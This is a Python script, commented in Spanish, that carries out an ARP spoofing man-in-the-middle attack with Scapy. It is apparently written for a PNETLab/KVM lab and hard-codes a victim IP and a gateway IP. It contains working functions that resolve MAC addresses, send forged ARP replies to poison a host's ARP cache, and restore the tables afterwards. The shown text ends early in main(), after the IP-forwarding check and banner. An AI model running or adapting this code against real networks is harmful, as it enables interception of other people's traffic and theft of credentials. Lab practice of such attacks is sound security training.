#!/usr/bin/env python3
"""
=============================================================
  ATAQUE MitM — ARP Spoofing / Poisoning ADAPTADO
  Protocolo: Address Resolution Protocol (ARP)
  Herramienta: Scapy
  Entorno: PNETLab / KVM (VLAN 10 Segmento Seguro)
=============================================================
"""

from scapy.all import ARP, Ether, sendp, get_if_hwaddr, srp
import time
import sys
import os
import signal

# ──────────────────────────────────────────────
#  CONFIGURACIÓN ADAPTADA A TU TOPOLOGÍA REAL
# ──────────────────────────────────────────────
INTERFACE  = "ens4.10"        # Tu subinterfaz de KVM para la VLAN 10
IP_VICTIMA  = "192.168.10.100" # La IP real que tomó tu VPC-1 por DHCP
IP_GATEWAY  = "192.168.10.254" # IP de la subinterfaz Ethernet0/0.10 en R1
INTERVALO   = 2                # Segundos entre envíos de veneno ARP


def obtener_mac(ip: str) -> str:
    """Resuelve la MAC de una IP mediante ARP request."""
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    resp, _ = srp(pkt, iface=INTERFACE, timeout=3, verbose=False)
    if resp:
        return resp[0][1].hwsrc
    print(f"  [!] No se pudo resolver la MAC de {ip}. ¿Está activo el host?")
    sys.exit(1)


def envenenar(ip_objetivo: str, mac_objetivo: str,
              ip_suplantada: str) -> None:
    """
    Envía un ARP Reply diciendo:
      'La IP <ip_suplantada> tiene la MAC del atacante'
    al host <ip_objetivo>.
    """
    paquete = Ether(dst=mac_objetivo) / ARP(
        op      = 2,                               # ARP Reply
        pdst    = ip_objetivo,
        hwdst   = mac_objetivo,
        psrc    = ip_suplantada,                   # IP que suplantamos
        hwsrc   = get_if_hwaddr(INTERFACE),        # Nuestra MAC real en ens4.10
    )
    sendp(paquete, iface=INTERFACE, verbose=False)


def restaurar(ip_objetivo: str, mac_objetivo: str,
              ip_real: str,    mac_real: str) -> None:
    """
    Restablece las tablas ARP correctas enviando
    ARPs legítimos con las MACs originales.
    """
    for _ in range(5):
        paquete = Ether(dst=mac_objetivo) / ARP(
            op   = 2,
            pdst = ip_objetivo,
            hwdst= mac_objetivo,
            psrc = ip_real,
            hwsrc= mac_real,
        )
        sendp(paquete, iface=INTERFACE, verbose=False)
        time.sleep(0.2)


def main():
    # Verificar de forma segura que el IP forwarding esté activo
    if not os.path.exists("/proc/sys/net/ipv4/ip_forward"):
        print("  [!] Error: No se puede verificar el IP forwarding en este OS.")
        sys.exit(1)

    fwd = open("/proc/sys/net/ipv4/ip_forward").read().strip()
    if fwd != "1":
        print("  [!] IP forwarding desactivado. Actívalo ejecutando primero:")
        print("      sudo sysctl -w net.ipv4.ip_forward=1")
        sys.exit(1)

    print("=" * 55)
    print("  ATAQUE MitM — ARP Spoofing (Entorno Calibrado)")
    print("=" * 55)
    print(f"  Interfaz : {INTERFACE}")
    print(f"  Víctima  : {IP_VICTIMA}")
    print(f"  Gateway  : {IP_GATEWAY}")
    print(f"  Intervalo: {INTERVALO}s\n")
